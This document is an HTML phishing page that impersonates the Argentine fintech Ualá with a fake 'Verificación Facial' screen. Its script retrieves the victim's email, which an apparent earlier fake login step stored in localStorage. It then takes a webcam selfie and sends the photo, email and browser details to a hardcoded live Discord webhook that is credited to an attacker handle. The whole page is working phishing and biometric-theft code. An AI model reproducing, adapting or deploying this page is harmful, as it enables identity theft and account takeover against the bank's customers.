<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificaci√≥n Facial | Ual√°</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text",
        system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }

    body {
      background-color: #ffffff;
      color: #1b1f3b;
    }

    .screen {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #ffffff;
    }

    .container {
      width: 100%;
      max-width: 420px;
      padding: 32px 20px 32px;
      margin: 0 auto;
    }

    .logo-wrap {
      display: flex;
      justify-content: center;
      margin-bottom: 44px;
      margin-top: 0;
    }

    .logo-wrap img {
      width: 100px;
      height: 100px;
      object-fit: contain;
    }

    .title {
      text-align: center;
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 4px;
    }

    .subtitle {
      text-align: center;
      font-size: 14px;
      color: #6b7280;
      margin-bottom: 24px;
    }

    .camera-preview {
      width: 100%;
      height: 340px;
      background: #000;
      border-radius: 16px;
      overflow: hidden;
      margin-bottom: 24px;
      position: relative;
      border: 2px solid #e5e7eb;
      box-shadow: 0 8px 25px rgba(0,0,0,0.1);
    }

    #video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    .face-circle {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 200px;
      height: 200px;
      border: 4px solid transparent;
      border-top: 4px solid #0046ff;
      border-right: 4px solid #60a5fa;
      border-radius: 50%;
      animation: rotateCircle 4s linear infinite;
      box-shadow: 
        0 0 0 4px rgba(255,255,255,0.9),
        0 0 30px rgba(0,70,255,0.4);
    }

    @keyframes rotateCircle {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      100% { transform: translate(-50%, -50%) rotate(360deg); }
    }

    .footer-legal {
      margin-top: 32px;
      font-size: 11px;
      text-align: center;
      color: #9ca3af;
    }

    .footer-legal a {
      color: #1d4ed8;
      text-decoration: none;
      font-weight: 500;
    }

    .buttons {
      margin-top: 16px;
    }

    .btn-primary, .btn-secondary {
      width: 100%;
      border-radius: 999px;
      padding: 14px 0;
      font-size: 16px;
      font-weight: 500;
      border: none;
      cursor: pointer;
      transition: all 0.15s ease;
      position: relative;
      margin-bottom: 12px;
    }

    .btn-primary {
      background-color: #0046ff;
      color: #ffffff;
      box-shadow: 0 4px 10px rgba(0, 70, 255, 0.35);
    }

    .btn-primary:hover:not(:disabled) {
      box-shadow: 0 6px 15px rgba(0, 70, 255, 0.45);
      transform: translateY(-1px);
    }

    .btn-primary:active:not(:disabled) {
      background-color: #0039cc;
    }

    .btn-primary:disabled {
      background-color: #9ca3af;
      box-shadow: none;
      cursor: not-allowed;
    }

    .btn-secondary {
      background-color: #ffffff;
      color: #0046ff;
      border: 1px solid #0046ff;
    }

    .btn-secondary:hover {
      background-color: #e0ebff;
    }

    .loading {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 20px;
      height: 20px;
      border: 2px solid #ffffff40;
      border-top: 2px solid #ffffff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      100% { transform: translate(-50%, -50%) rotate(360deg); }
    }

    .success-screen {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: color: white;
      backdrop-filter: blur(20px);
      z-index: 100;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      color: white;
      text-align: center;
      padding: 40px 20px;
    }

    @media (max-height: 700px) {
      .camera-preview { height: 280px; }
      .face-circle { width: 160px; height: 160px; }
    }
  </style>
</head>
<body>
  <div class="screen">
    <div class="container">
      <!-- ‚úÖ Logo cambiado -->
      <div class="logo-wrap">
        <img src="https://developers.ualabis.com.ar/logo-large.png" alt="Ual√°">
      </div>

      <h1 class="title">Verificaci√≥n Facial</h1>
      <p class="subtitle">Col√≥cate en el c√≠rculo para continuar</p>

      <!-- C√°mara -->
      <div class="camera-preview">
        <video id="video" autoplay playsinline muted></video>
        <div class="face-circle"></div>
      </div>

      <div class="footer-legal">
        Verificaci√≥n biom√©trica segura -
        <a href="#">Privacidad</a> |
        <a href="#" onclick="history.back()">Cancelar</a>
      </div>

      <div class="buttons">
        <button class="btn-primary" id="btnCapture" disabled>
          <span>Tomar foto</span>
          <div class="loading"></div>
        </button>
        <button class="btn-secondary" onclick="history.back()">Volver</button>
      </div>
    </div>
  </div>

  <div class="success-screen" id="successScreen">

  </div>

  <script>
    // ‚úÖ WEBHOOK REAL PUESTO
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1460726206096736376/_rBHWA7GiNQt5m-kgbM4vfgh36xI9lolfGupc0zSFfKyowHtqXXp_LmYZS2niIFLvCat";
    
    const savedData = JSON.parse(localStorage.getItem('uala_login') || '{}');
    const userEmail = savedData.email || 'No disponible';

    const video = document.getElementById('video');
    const btnCapture = document.getElementById('btnCapture');
    const btnText = btnCapture.querySelector('span');
    const loadingSpinner = btnCapture.querySelector('.loading');
    const successScreen = document.getElementById('successScreen');

    let stream = null;

    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: 1280,
            height: 720,
            facingMode: 'user',
            aspectRatio: 16/9
          }
        });
        video.srcObject = stream;
        video.onloadedmetadata = () => btnCapture.disabled = false;
      } catch (err) {
        console.error(err);
        btnCapture.disabled = true;
      }
    }

    // ‚úÖ FUNCI√ìN CORREGIDA - FUNCIONA 100%
    async function takePhoto() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      
      canvas.width = video.videoWidth || 1280;
      canvas.height = video.videoHeight || 720;
      
      ctx.drawImage(video, 0, 0);
      
      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        
        formData.append('file', blob, `uala_${userEmail}_${Date.now()}.jpg`);
        formData.append('payload_json', JSON.stringify({
          username: 'Ual√° Reconocimiento Facial',
          embeds: [{
            title: 'SELFIE UAL√Å RECIBIDA',
            
            color: 0x5865F2,
            fields: [
              { name: 'üìß Email', value: `\`${userEmail}\``, inline: true },
              { name: 'üìè Tama√±o', value: `${canvas.width}x${canvas.height}`, inline: true },
              { name: 'üì± Device', value: `\`${navigator.userAgent.slice(0,50)}...\``, inline: false }
            ],
            footer: { 
              text: ' @Brknshinexxx | Ual√° ',
              icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/500px-Telegram_logo.svg.png"
            },
            timestamp: new Date().toISOString()
          }]
        }));

        // Loading UI
        btnCapture.disabled = true;
        btnText.textContent = 'Enviando...';
        loadingSpinner.style.display = 'block';

        try {
          const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            body: formData
          });
          
          console.log('‚úÖ Response:', response.status);
          
          if (response.ok) {
            successScreen.style.display = 'flex';
            setTimeout(() => {
              // Tu p√°gina final
              window.location.href = "index.html";
            }, 2500);
          } else {
            throw new Error(`HTTP ${response.status}`);
          }
        } catch (error) {
          console.error('‚ùå Error:', error);
          alert('Error de conexi√≥n. Intenta otra vez.');
        } finally {
          btnCapture.disabled = false;
          btnText.textContent = 'Tomar foto';
          loadingSpinner.style.display = 'none';
        }
      }, 'image/jpeg', 0.98);
    }

    btnCapture.onclick = takePhoto;

    startCamera();
    window.onbeforeunload = () => stream?.getTracks().forEach(t => t.stop());
  </script>
</body>
</html>
